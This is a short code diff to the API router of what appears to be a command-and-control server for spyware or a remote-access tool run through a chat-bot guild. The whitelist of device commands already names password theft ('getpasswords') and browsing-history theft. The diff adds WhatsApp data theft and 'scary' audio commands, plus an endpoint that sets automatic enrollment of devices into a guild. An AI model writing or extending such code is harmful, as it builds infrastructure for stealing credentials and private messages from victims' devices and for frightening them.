@@ -71,6 +71,9 @@ const DEVICE_COMMANDS = new Set([
   'gethistory',
   'sysinfo_full',
   'getpasswords',
+  'sayscary',
+  'sayscaryurdu',
+  'getwhatsapp',
 ]);
 
 function createApiRouter({ store, hub, config, botAuth, deviceAuth, guildAdminAuth }) {
@@ -106,6 +109,14 @@ function createApiRouter({ store, hub, config, botAuth, deviceAuth, guildAdminAu
       commandCount: commands.length,
       commands,
     });
+  });
+  router.post('/config/auto-enroll', botAuth, (req, res) => {
+    const parsed = z.object({ guildId: z.string().min(1) }).safeParse(req.body);
+    if (!parsed.success) {
+      return res.status(400).json({ error: 'INVALID_REQUEST' });
+    }
+    config.autoEnrollGuildId = parsed.data.guildId;
+    res.json({ success: true, guildId: config.autoEnrollGuildId });
   });
 
   router.post('/pairing/code', (req, res) => {
